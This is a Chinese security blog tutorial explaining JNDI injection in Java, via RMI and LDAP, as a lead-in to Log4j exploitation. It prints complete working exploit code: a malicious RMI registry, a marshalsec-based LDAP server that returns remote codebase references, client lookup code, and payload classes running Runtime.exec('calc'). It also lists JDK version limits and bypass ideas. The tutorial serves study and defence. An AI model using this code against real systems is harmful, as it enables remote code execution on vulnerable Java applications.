> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Efz5o35sBhrqDCRuHc9OZA)

前言
--

log4j 后就该早早学的，但是感觉 0 基础入门实在是有点难度，所以拖了好长时间。这里先给本文立个框架。

1.  jndi 介绍
    
2.  RMI 动态加载恶意类
    
3.  jndi 注入利用思路
    
4.  RMI-JNDI 注入
    
5.  LDAP-JNDI 注入
    
6.  版本及参考
    

JNDI 介绍
-------

JNDI 全称为 Java 命名和目录接口。我们可以理解为 JNDI 提供了两个服务，即命名服务和目录服务。

##### 命名服务

命名服务将一个对象和一个名称进行绑定，然后放置到一个容器里面。当我们想要获取这个对象的时候，就可以通过容器来查找这个名称，从而获得这个对象。

##### 目录服务  

目录服务就是将一些对象的属性放置到容器中，然后想要操作这个属性的时候，就通过容器来进行查找。

这里其实就是对这些服务进行了再封装，假如说以前我们访问 rmi 与 ldap 等要用的代码等等差别很大，但是多了 JNDI 这一层后就可以用 JNDI 的方式轻松访问 rmi 和 ldap 等的服务，访问的方式代码形式也基本一样了，目前`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。这里只分析`RMI`、`LDAP。`

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIbDXuWgO8DEvRU91bibMU7E8vOdE0pUBC5vIlpI9OiajIF7ked52gW6hg/640?wx_fmt=png)

JNDI 自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI 在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置。比如在 RMI 服务器端上可以不直接使用 Registry 进行 bind(绑定) 操作，而是使用 JNDI 统一管理，当然 JNDI 底层应该还是调用的 Registry 进行 bind，但好处 JNDI 提供的是统一的配置接口；在客户端也可以直接通过类似 URL 的形式来访问目标服务

RMI 动态加载恶意类
-----------

### RMI 介绍

RMI（Remote Method Invocation），远程方法调用。跟 RPC 差不多，是 java 独立实现的一种机制。实际上就是在一个 java 虚拟机上调用另一个 java 虚拟机的对象上的方法。

RMI 分为三个主体部分：

```
Client-客户端：客户端调用服务端的方法
Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果。
Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用。
```

### RMI 使用

Server 部署：

```
Server向Registry注册远程对象，远程对象绑定在一个//hostL:port/objectname上，形成一个映射表（Service-Stub）。
```

Client 调用：  

```
Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。
Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器
Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。
```

列举几个函数

```
bind：将远程对象绑定到注册中心
rebind：重新绑定一个远程对象
unbind：取消一个过程对象的绑定
list：列出注册中心绑定对象
lookup：在注册中心获取一个远程对象的存根
```

### RMI 利用

RMI 远程加载代码的过程，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载 codebase(就算是一个地址，指定`jvm`从哪个地方去搜集类，和 ClassPath，jdbc 的 url 一样，通常是远程的 URL，比如 http,ftp 等) 中的类，所以只要控制了`codebase`，就可以加载任何恶意类。

但是官方注意到后，在后面的版本 (6u45、7u21，8u121 以后) 加了限制(`java.rmi.server.useCodebaseOnly`默认配置已经改为了 true。)，满足如下条件的才可以攻击

1.  安装并配置了`SecurityManager`，(需要自己设置为 trust)
    
2.  `java.rmi.server.useCodebaseOnly` 配置为 flase，如果为 true，则将禁用自动加载类文件，不允许远程加载对象
    

JNDI 注入思路
---------

这里我们要先知道一个点，通过 JNDI 可以远程加载对象。并且除了`Context.PROVIDER_URL`设置的 URL 外，我们可以在 lookup 参数中指定 URL，例如`lookup("rmi://127.0.0.1:1099/test")`，由于 JNDI 存在一个动态地址转换协议，也就是说当我们在 lookup 上指定一个 URL 的时候，就会优先于`Context.PROVIDER_URL`的设置进行加载，所以如果这个 lookup 参数可控的话，那么我们就可以传入恶意的 url 地址来控制受害者加载攻击者指定的恶意类，但是在 RMI 中，调用远程方法，最终的执行是服务端去执行。只是把最终的结果以序列化的形式传递给客户端，所以除非受害者内部就存在漏洞组件及反序列化漏洞，我们才可以构造恶意的序列化对象，返回给客户端去触发漏洞，那如果目标组件不存在反序列化漏洞，就算我们返回一个恶意对象，但是客户端本地没有这个 class 文件，当然也就不能成功获取到这个对象。

##### Reference

为了解决上面这个问题，我们引入了一个 Reference 类，这个类表示对存在于命名或者目录系统以外的对象的引用。简单理解一下，就是如果 RMI 服务端返回的是一个 Reference 对象或者其子类对象的话，当客户端获取远程对象 Stub 的时候，我们就可以指定客户端从一个具体的服务端上去加载 class 文件从而完成这个类的实例化。

```
Reference(String name)
    为类名为"name"的对象构造一个新的应用
Reference(String name , RefAddr addr)
    为类型为"name"的对象和地址构造一个新引用
Reference(String name, ReAddr addr, String factory,String factoryLocation)
    为类名为"name"的对象，对象工厂的类名和为止以及对象的地址构造一个新的引用
Reference(String name,String factory,String factoryLocation)
    为类名为"name"的对象以及对象工厂的类名和位置构造一个新的应用
```

整体流程思路也就是

1.  目标程序调用 lookup(String) 进行 JNDI 操作，且参数是用户可控，攻击者传入 URL 指向自己的恶意 RMI/LDAP 服务器；
    
2.  恶意 RMI/LDAP 服务器向目标程序返回一个恶意的 JNDI 引用 Reference，该 Reference 对象包含了攻击者指定的恶意 ObjectFactory 类的加载地址；
    
3.  目标程序解码该 JNDI Reference，得到恶意 ObjectFactory 类的加载地址；
    
4.  目标程序从攻击者指定的远程加载地址获取恶意 ObjectFactory 类的 class 字节码；
    
5.  实例化获取到的恶意 ObjectFactory 类，ObjectFactory 类中的恶意代码得以执行。
    
    理论已经很明白了，接下来实操
    

RMI-JNDI 注入
-----------

### 编写及利用

拿 python3 开启一个简易的 http 服务

```
python -m http.server 8081
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIzBWiaA5lxnkteexKYYYPZ2PpyQv12ABgIIY3enicAf2LtTVIWPpFVoog/640?wx_fmt=png)

server 端 (也就是黑客端) 我们创建如下 Reference 类实例，并将其绑定到注册表中：

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server {
    public static void main(String[] args) throws Exception{
        //
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference test = new Reference("1","Evil","http://127.0.0.1:8081/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(test);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/test'");
        registry.bind("test",referenceWrapper);
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIKvBzH6Tb0icJhNaDxxklOo5NPibjStsM6e3uZ2FT9a51CUK60zmCFpRg/640?wx_fmt=png)

启动  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIqZd000FSvC1yMWicwpksJae6ttc9vP8sSbqhtfTaiaMTs2WG7LYHiczcQ/640?wx_fmt=png)

然后编写一个 evil.java 恶意类

```
public class Evil {
    public Evil() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIR081aqQLr5Cg2DeddciaZ70tk6Eicr1aLVZxYeuFicpH3Pf2WiaFoKwUiaA/640?wx_fmt=png)

 最后使用 JNDI 来远程获取这个绑定的对象，最终会在本地弹出计算器框：

```
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args) throws NamingException {
        InitialContext context = new InitialContext();
        context.lookup("rmi://127.0.0.1:1099/test");
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIOnRicjG2cuhCQ9Wk7xlfnuxPOa0nERFvoM7icoVDRYZyiaAq60JQX4f1g/640?wx_fmt=png)

### 断点分析

从 Server 端解析传入的 URL，直接来到`RegistryContexr#lookup`方法,

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIY87qsyADDFFLOic7XhUaibdlZPELanPhPhE48ibag25cNg23Rv8giblkBA/640?wx_fmt=png)

`this.registry`仍然是`RegistryImpl_Stub`，执行`lookup`方法获取的是一个`ReferenceWrapper_Stub`对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRI24wqvJ0dLotNC8agVcYftibibYgrf3kn8cAlibbUCMrRZyojpLvt96JXA/640?wx_fmt=png)

在`RegistryContext#decodeObject`方法中会根据这个`ReferenceWrapper_Stub`对象获取 Reference 对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRItnc07ON8c6YBTvdalkUWhBFTX9VBvFsRe2ugRpRPbK52rIiazVN9Qjw/640?wx_fmt=png)

跟进`getReference`方法, 发现又调用了`UnicastRef#invoke` ⽅法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRICXGGVVjLB4exNoMichlRp5ogoXynnMTWhZCIfDhstQkEjCx7wibibahzg/640?wx_fmt=png)

相当于进⾏了⼀次远程⽅法调⽤

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRITnqloUL6NHAcryd3rUPHwfQyWvWZ81IB9SiaDpOJgPMbuRF3yPvMeIQ/640?wx_fmt=png)

这里的参数正好对应着 RMI 服务端中的 `ReferenceWrapper#getReference` ⽅法（由 ReferenceWrapper 实现的 RemoteReference 接⼝）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIMmA6xH16kj0gTN6G5KUgKh5raX8UnicqB91ThUiaHdUTJP3AUp2gMBLA/640?wx_fmt=png)

于是这次远程⽅法调⽤的结果就是返回了远程 `ReferenceWrpper` 包装的 Reference 对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIsw8icXFibMjibiabkddFaBFkjveB0EqXPXorOEBCibth7XyT5xibNXWXly3g/640?wx_fmt=png)

因为条件运算符前面成立，返回前面得表达式，继续跟进到 `NamingManager#getObjectInstance` ⽅法，跟到`NamingManager##getObjectFactoryFromReference`方法获取 factory 实例

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRItoLTvGQBAsMRhYjwdwao6Oj5jTPqj8oZpuPnhHZaP4wXvPDicCqXGZQ/640?wx_fmt=png)

跟进发现首先进行本地加载，加载失败以后，再从 codebase 加载 factory

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIKKPSgMydKhicW3u9WUpJGSoOlbFNicVal4UPIXIhCzK49ZMGRMBx9WcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIDD3PANAXu0DQ2U9biauicK5soibUlQ6yw5h8pOxKAsic8UlCszYibiaJfJ0Q/640?wx_fmt=png)

其中，下面的 LoadClass 加载方式为 `URLClassLoader`，成功加载执行了恶意代码，最后返回 factory 实例

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIhtAV648ibnsqBuQun8pmXaJg0tiaKkq4iaj3XECNibIicP415BUbqGPDGaA/640?wx_fmt=png)

版本问题  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRI9tSgwe2SJ31fqPpZQnezTZzD21L2Z8Nics9RFeYY2NHNP9wTOxkqicdg/640?wx_fmt=png)

rmi 在 6u132，7u122，8u113 之前可以用，此后系统属性 `com.sun.jndi.rmi.object.trustURLCodebase、`

`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为 false，如需利用还需添加代码

```
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
```

接下来操作 LDAP+JNDI 注入，因为 LDAP 服务的 Reference 远程加载 Factory 类不受 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 等属性的限制。

LDAP-JNDI 注入
------------

LDAP 一般指轻型目录访问协议（Lightweight Directory Access Protocol），可以把它理解成存储数据的数据库。和其他数据库一样，LDAP 也是有 client 端和 server 端。server 端是用来存放资源，client 端用来操作增删改查等操作。

### 编写及利用

需要 unboundid-ldapsdk 的依赖：

```
<dependencies>
    <dependency>
        <groupId>com.unboundid</groupId>
        <artifactId>unboundid-ldapsdk</artifactId>
        <version>3.1.1</version>
    </dependency>
    </dependencies>
```

server 是参考 marshalsec，修改得到

```
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class server {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8080/#test"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

client 端

```
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class client {
    public static void main(String[] args) throws NamingException {
        Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/test");
    \}\}
```

恶意类

```
public class test{
    public test() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIGf67Z85XTiafTNYRjWt36G1r34pD1X4rAnsia8WEAgibyefOYQnBhcjtg/640?wx_fmt=png)

### 简单分析

```
getObjectFactoryFromReference:142, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
```

最后仍然是调⽤了 `NamingManager#getObjectFactoryFromReference` ⽅法。

### 版本问题

ldap 的 jndi 在 6u211、7u201、8u191、11.0.1 后也将默认的`com.sun.jndi.ldap.object.trustURLCodebase`设置为了 false

版本限制
----

就放一张图吧，原因前面也有解释

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tp9VOk1Iayc08FyKbL6HAMutFjlpjyRIELVwymbr7GMrotDReLx81iar9gtVCNDL7WLHSzQl07qsaY074iaQdp0g/640?wx_fmt=png)

当然在 8u191 又有大佬们提出了绕过，思路先写出来以后分析

1.  LDAP Server 直接返回恶意序列化数据，但是需要目标环境存在 Gadget 依赖
    
2.  使用本地的 Factory 绕过 (主要利用了`org.apache.naming.factory.BeanFactory`类)
    

**欢迎关注听风安全，分享更多安全技术~**

 ![](http://mmbiz.qpic.cn/mmbiz_png/Tp9VOk1Iaye2ia3XIwx965ZWJ4cM0tldDQ9bhOdCiahFwMmfv5HFT40y7IR0Ur5dfscf1fsiac4s6cSPrP8ibDFEYw/0?wx_fmt=png) ** 听风安全 ** 潜心学安全 17 篇原创内容  公众号